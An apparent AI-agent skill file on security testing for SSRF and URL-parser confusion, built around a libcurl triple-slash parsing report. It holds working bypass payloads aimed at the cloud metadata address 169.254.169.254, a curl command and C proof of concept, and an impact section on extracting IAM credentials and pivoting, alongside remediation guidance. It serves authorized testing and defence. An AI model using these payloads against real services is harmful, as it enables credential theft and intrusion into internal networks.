---
name: url-parser-confusion-testing
description: Detect SSRF filter bypasses and URL-parsing inconsistencies caused by malformed URL syntax — triple-slash (http:///host/path), backslashes, encoded delimiters, userinfo, numeric IP forms, IPv4-mapped IPv6. Use when reviewing URL validation, hostname allowlists, SSRF protections, redirect handling, or any code that parses user-supplied URLs (curl/libcurl CURLU, WHATWG URL, Python urllib, Node, Go, Java). Reproduces and extends HackerOne #3923212 (curl URL API triple-slash). Produces parser-differential reports, PoC variants, and remediation guidance.
---

# URL Parser Confusion & SSRF Filter Bypass

Different URL parsers disagree on how to interpret malformed URLs. When an application **validates with one parser** and **fetches with another** (or fetches with the same parser but mis-trusts its output), an attacker can craft a URL that passes the allowlist check but resolves to an attacker-chosen host → **Server-Side Request Forgery (SSRF)**. Targets must be within the scope of the engagement you are authorized to test.

## When to Use
- URL validation, webhook inputs, and proxy/fetch endpoints (`/fetch?url=...`, `/preview?url=...`, `/webhook`)
- Hostname allowlist / denylist bypass assessments
- Microservice architecture audits where validation and HTTP client libraries differ (e.g. Node validator + curl/Go backend)
- SSRF filter bypass assessments for cloud metadata endpoints (`169.254.169.254`, `metadata.google.internal`) or internal network ranges (`10.0.0.0/8`, `127.0.0.1`)
- Reviewing C/C++, Python, Node.js, Go, Java, or PHP URL handling logic

## Reference Case: HackerOne #3923212 (curl URL API)
libcurl's `parseurl()` in `lib/urlapi.c` misparses `http:///host/path`. Per RFC 3986 the authority between `//` and `/` is **empty**, so `/host/path` is the **path**. libcurl instead treats the first path segment as the **hostname** (slash counter reaches 3, `hostp` is set to whatever follows the third slash).

```bash
# curl CLI reproduction (path becomes hostname)
curl -w "\n%{url_effective}\n" http:///169.254.169.254/latest/meta-data/
# -> http://169.254.169.254/latest/meta-data/

# CURLU API PoC (compile: gcc poc.c $(curl-config --cflags --libs))
#include <stdio.h>
#include <curl/curl.h>
int main(void) {
  CURLU *u = curl_url();
  curl_url_set(u, CURLUPART_URL,
               "http:///169.254.169.254/latest/meta-data/", 0);
  char *host = NULL, *path = NULL;
  curl_url_get(u, CURLUPART_HOST, &host, 0);
  curl_url_get(u, CURLUPART_PATH, &path, 0);
  printf("host=%s path=%s\n", host, path);   // host=169.254.169.254
  curl_free(host); curl_free(path); curl_url_cleanup(u);
  return 0;
}
```

---

## Phase 0: Recon & Target Mapping
1. **Identify URL Input Endpoints:**
   - Webhook registration, avatar/image import by URL, PDF generation from URL, oEmbed/rich link preview, proxy/cache endpoints.
2. **Identify Validation Mechanisms:**
   - RegEx pattern matching on domain names.
   - Parsing domain via URL library followed by string suffix check (`.endswith("example.com")`).
   - Allowlist / Blocklist checking against IP ranges or DNS resolutions.
3. **Identify Backend Fetch Client:**
   - Determine which HTTP client fetches the URL: cURL / libcurl, Python `requests`/`urllib`, Node `fetch`/`axios`, Go `net/http`, or Java `HttpURLConnection`.

---

## Phase 1: Differential Parser Testing
Compare how different parsers treat candidate URLs:

| Technique | Example Syntax | Parser Behavior Differential |
| :--- | :--- | :--- |
| **Triple-Slash Anomaly** | `http:///169.254.169.254/path` | RFC 3986 (Python/Node): empty authority / path `/169.254.169.254/path`.<br>libcurl (< 8.11): host `169.254.169.254`. |
| **Userinfo Delimiters** | `http://trusted.com@169.254.169.254/` | Validator sees `trusted.com` user, fetcher connects to `169.254.169.254`. |
| **Backslash Substitution** | `http://trusted.com\169.254.169.254/` | WHATWG (Node/browser) converts `\` to `/` (host = `trusted.com`).<br>libcurl / Go treats `\` as path or host character. |
| **URL-Encoded Delimiters** | `http://trusted.com%23@169.254.169.254/` | Unescaped in validation vs. escaped in HTTP client. |
| **Numeric & Hex IPs** | `http://0xa9fea9fe/` or `http://2852039166/` | Decimal/Hex representation of `169.254.169.254`. |
| **IPv4-Mapped IPv6** | `http://[::ffff:169.254.169.254]/` | Bypasses naive IPv4 string blocklists. |

---

## Phase 2: Probing & Bypasses
Test target endpoints with differential payloads using the bundled automation tool or cURL:

```bash
# Run standalone differential test against default cloud metadata IP
python3 scripts/url_parser_diff.py

# Test custom target internal IP and path
python3 scripts/url_parser_diff.py --ip 169.254.169.254 --path /latest/meta-data/

# Filter only parser disagreements
python3 scripts/url_parser_diff.py --only-interesting
```

---

## Phase 3: Automation Tooling (`url_parser_diff.py`)
The bundled tool [`scripts/url_parser_diff.py`](scripts/url_parser_diff.py) natively tests:
- Python `urllib.parse` (RFC 3986)
- cURL / libcurl CLI (`%{url_effective}`)
- Node.js `WHATWG URL` (when Node is available)

```bash
# Output JSON for CI/CD or automation pipelines
python3 scripts/url_parser_diff.py --json
```

---

## Phase 4: Impact Chaining & Reporting
- **Cloud Metadata Access:** Extract IAM credentials, API keys, service account tokens (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`).
- **Internal Microservice Exploitation:** Access unauthenticated internal administrative panels, Kubernetes kubelet APIs, or internal REST services.
- **Port Scanning & Network Pivoting:** Enumerate internal open ports and services across private CIDR ranges.

---

## CVSS 3.1 & CWE Mapping

- **CWE-918:** Server-Side Request Forgery (SSRF)
- **CWE-625:** Permissive List of Allowed Inputs
- **CWE-20:** Improper Input Validation
- **CVSS:3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N` (Base Score: **8.6 High** / Critical depending on cloud IAM exposure)

---

## Remediation Checklist

- [ ] **Single Unified Parser:** Use the exact same parser/client library for validation and fetching.
- [ ] **Resolve DNS First & Validate IP:**
  1. Resolve DNS hostname to IP address.
  2. Validate that the resolved IP does NOT belong to private ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`, `::1`, `fc00::/7`).
  3. Connect directly to the verified IP address (prevent DNS rebinding via fixed-IP connection or custom dialer).
- [ ] **Disable Redirection or Validate Redirect Targets:** Ensure HTTP clients do not blindly follow redirects to internal IP addresses.
- [ ] **Enforce Strict Scheme Restrictions:** Allow only `http` and `https` schemes; reject all other schemes (`gopher://`, `file://`, `ftp://`).
